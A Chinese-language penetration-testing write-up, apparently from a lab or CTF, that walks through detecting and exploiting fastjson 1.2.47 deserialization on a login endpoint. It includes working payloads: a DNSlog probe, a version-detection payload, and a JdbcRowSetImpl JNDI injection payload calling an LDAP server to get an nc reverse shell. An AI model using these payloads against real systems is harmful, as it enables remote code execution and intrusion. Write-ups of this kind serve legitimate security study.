进入首页，点击登录，

![img](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693191736651-e3b5b502-ce95-44f5-ad31-fcf1606ead6f.png)

在登录处抓包，发现为json格式传入参数：

![img](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693192153552-521f193f-9d9a-4db4-ba41-660711b12100.png)

删个末尾的}(也可以加个"),看报错，很标准的fastjson错误提示，确定后端使用的fastjson

![img](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693193197646-62ce7b5b-6bd1-4a24-945f-29c92db88de9.png)

dnslog测试是否存在漏洞：

```json
{
  "@type":"java.net.Inet4Address",
  "val":"zqs9do.dnslog.cn"
}
```

![img](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693193170900-b5d8c328-b3be-4cde-9d5e-4d2ec87e8f36.png)

收到请求，存在漏洞。

![img](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693193352521-8c8b62d7-a0d9-4495-9c2e-2c492545a53c.png)

探测fastjson精确版本：

```json
{
  "@type": "java.lang.AutoCloseable"
```

通过报错，发现版本为1.2.47，很经典的版本漏洞，利用mappings缓存机制，JdbcRowSetImpl打jndi，但前提是需要机器出网。

关于这种方式探测fastjosn版本，条件是需要response中会回显报错信息，但实际环境可能存在不回显的情况，那就需要利用其他手段了，如dnslog、ddos等间接判断，比较麻烦，可以看之前的文章。

![img](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693193602921-8576c74b-f368-4183-92c6-a53ceadcf5cd.png)

利用jndi注入工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all

使用nc反弹shell，bash反弹是不能成功的，因为没有。

![img](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693194183137-f8cbad85-3dea-429d-9efd-bc9c4f674e06.png)

```json
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://10.30.0.84:1389/wwsebk",
        "autoCommit":true
    }
}
```

接收到shell

![img](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693194117924-d06b6325-339a-4d94-aeff-05ef67e288cc.png)

# 4. 